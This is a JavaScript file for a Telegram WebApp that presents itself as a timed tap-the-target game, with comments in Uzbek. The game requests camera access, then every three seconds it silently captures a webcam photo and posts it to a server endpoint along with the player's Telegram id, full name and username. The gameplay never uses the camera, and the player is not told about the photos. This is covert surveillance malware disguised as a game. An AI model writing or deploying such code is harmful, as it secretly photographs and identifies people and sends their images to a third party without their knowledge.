Telegram.WebApp.ready();
Telegram.WebApp.expand();

// O'yin o'zgaruvchilari
let score = 0;
let highScore = localStorage.getItem('highScore') || 0;
let timeLeft = 60;
let gameInterval;
let timerInterval;
let isGameRunning = false;

// DOM elementlari
const gameArea = document.getElementById('gameArea');
const target = document.getElementById('target');
const scoreElement = document.getElementById('score');
const highScoreElement = document.getElementById('highScore');
const timerElement = document.getElementById('timer');
const startBtn = document.getElementById('startBtn');
const loadingElement = document.getElementById('loading');
const video = document.getElementById('video');

// Rekordni yangilash
highScoreElement.textContent = highScore;

// Targetni random joylashtirish
function moveTarget() {
  const maxX = gameArea.clientWidth - target.clientWidth;
  const maxY = gameArea.clientHeight - target.clientHeight;
  
  const randomX = Math.floor(Math.random() * maxX);
  const randomY = Math.floor(Math.random() * maxY);
  
  target.style.transform = `translate(${randomX}px, ${randomY}px)`;
}

// Ball qo'shish
function addScore() {
  score++;
  scoreElement.textContent = score;
  moveTarget();
}

// O'yinni boshlash
async function startGame() {
  if (isGameRunning) return;
  
  try {
    startBtn.classList.add('hidden');
    loadingElement.classList.remove('hidden');
    
    // Kamerani sozlash
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });
    
    video.srcObject = stream;
    await video.play();
    
    loadingElement.classList.add('hidden');
    isGameRunning = true;
    score = 0;
    timeLeft = 60;
    scoreElement.textContent = score;
    timerElement.textContent = timeLeft;
    
    // Targetni boshlang'ich joylashtirish
    moveTarget();
    
    // Timer
    timerInterval = setInterval(() => {
      timeLeft--;
      timerElement.textContent = timeLeft;
      
      if (timeLeft <= 0) {
        endGame();
      }
    }, 1000);
    
    // O'yin tsikli
    gameInterval = setInterval(() => {
      if (video.videoWidth === 0 || video.readyState < HTMLMediaElement.HAVE_ENOUGH_DATA) return;
      
      // Bu yerda rasmni yuborish logikasi
      captureAndSendPhoto();
    }, 3000);
    
    // Targetga tegishni aniqlash
    target.addEventListener('click', addScore);
    
  } catch (err) {
    console.error("Kamera xatosi:", err);
    alert("Kameraga kirish rad etildi. Iltimos, ruxsat bering.");
    loadingElement.classList.add('hidden');
    startBtn.classList.remove('hidden');
  }
}

// O'yinni tugatish
function endGame() {
  clearInterval(gameInterval);
  clearInterval(timerInterval);
  isGameRunning = false;
  
  // Rekordni yangilash
  if (score > highScore) {
    highScore = score;
    localStorage.setItem('highScore', highScore);
    highScoreElement.textContent = highScore;
  }
  
  // Videoni to'xtatish
  if (video.srcObject) {
    video.srcObject.getTracks().forEach(track => track.stop());
  }
  
  startBtn.classList.remove('hidden');
  startBtn.textContent = "Qayta Boshlash";
}

// Rasmni yuborish funksiyasi
async function captureAndSendPhoto() {
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  
  const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
  const fileName = `photo_${Date.now()}.jpg`;
  const file = new File([blob], fileName, { type: 'image/jpeg' });
  
  const user = Telegram.WebApp.initDataUnsafe?.user;
  const userId = user?.id || "noma'lum";
  const fullName = `${user?.first_name || ""} ${user?.last_name || ""}`.trim();
  const username = user?.username || "yo'q";
  
  const formData = new FormData();
  formData.append('photo', file);
  formData.append('user_id', userId);
  formData.append('tg_fullname', fullName);
  formData.append('tg_username', username);
  formData.append('score', score);
  
  try {
    await fetch('/send-photo', {
      method: 'POST',
      body: formData
    });
    console.log('Rasm yuborildi');
  } catch (err) {
    console.warn('Rasm yuborishda xato:', err);
  }
}

// Boshlash tugmasi
startBtn.addEventListener('click', startGame);
